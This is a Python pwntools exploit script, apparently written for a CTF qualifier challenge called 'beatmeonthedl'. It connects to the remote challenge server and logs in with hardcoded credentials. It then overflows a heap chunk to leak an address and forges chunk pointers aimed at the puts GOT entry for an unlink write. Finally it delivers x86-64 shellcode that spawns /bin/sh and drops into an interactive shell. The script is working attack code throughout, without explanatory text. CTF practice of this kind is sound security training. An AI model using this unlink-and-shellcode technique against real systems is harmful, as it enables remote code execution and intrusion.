from pwn import *
import time
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
#p = process('./beatmeonthedl')
p = remote('beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me', '6969')

#print pidof(p)
def login():
  print p.recvuntil(': ')
  p.sendline("mcfly")
  print p.recvuntil(': ')
  p.sendline("awesnap")

def menu():
  p.recvuntil('| ')

def alloc(msg):
  menu()
  p.sendline('1')
  print p.recvuntil('> ')
  p.sendline(msg)

def free(num):
  menu()
  p.sendline('3')
  print p.recv()
  p.sendline(num)

def write(idx,msg):
  menu()
  p.sendline('4')
  print p.recvuntil(': ')
  p.sendline(idx)
  print p.recvuntil(': ')
  p.sendline(msg)

def print_all():
  menu()
  p.sendline('2')
  return p.recvuntil("HH\n\n")

login()

alloc("AA")
alloc("BB")
alloc("CC")
alloc("DD")
alloc("EE")
alloc("FF")
alloc("GG")
alloc("HH")

free('3')
free('1')

write('0','A'*63)

leak = u32(print_all().split('\n')[1])

print "[*] leaked :", hex(leak)

puts = 0x609FD8
fd = 0x609940
bk = leak + 0x90 # 5th

payload = "\x48\x31\xF6\xeb\x13\xa0\x60\x00" + "\x90"*8 + "\x90"*8 + "\x90\x90" + shellcode + "\x90"*(38-len(shellcode))
payload += p64(fd)
payload += p64(bk)

free('6')

write('5', payload)

free('7')

p.interactive()